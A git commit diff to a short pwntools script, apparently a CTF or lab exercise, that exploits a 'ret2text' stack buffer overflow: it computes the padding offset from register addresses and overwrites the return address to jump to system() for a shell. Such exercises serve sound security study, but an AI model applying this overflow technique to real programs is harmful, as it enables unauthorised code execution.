2ec256728648f6fe230039bbfbb762296f24a991
zevmre <zevmre@126.com>
2023-04-18 04:18:00 -0400

    ret2text based on registers info

--- ret2text.py
+++ ret2text.py
@@ -1,7 +1,9 @@
 from pwn import *
 
 system_addr=0x0804863a
-offset=0x6c+4
+eax=0xffffcfdc
+ebp=0xffffd048
+offset=ebp-eax+4
 sh=process("./ret2text")
 sh.sendline(b'A'*offset+p32(system_addr))
 sh.interactive()
